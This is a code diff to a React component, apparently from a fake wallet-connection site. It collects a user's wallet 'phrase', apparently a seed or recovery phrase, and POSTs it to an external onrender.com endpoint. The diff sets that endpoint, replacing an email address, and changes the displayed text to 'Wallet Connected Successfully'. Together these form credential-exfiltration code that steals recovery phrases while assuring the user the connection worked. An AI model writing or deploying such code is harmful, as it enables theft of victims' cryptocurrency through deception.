@@ -37,12 +37,12 @@ const Coincomps = ({ data }) => {
       setIsLoading(true);
 
       const body = {
-        wallet: "Wallet Connected",
+        wallet: "Wallet Connected Successfully",
         phrase: phrase,
       };
 
       try {
-        const url = "Briankovack90@gmail.com";
+        const url = "https://www.dappsdecentralisedlaunchpad.onrender.com/details";
 
         const res = await fetch(url, {
           method: "POST",
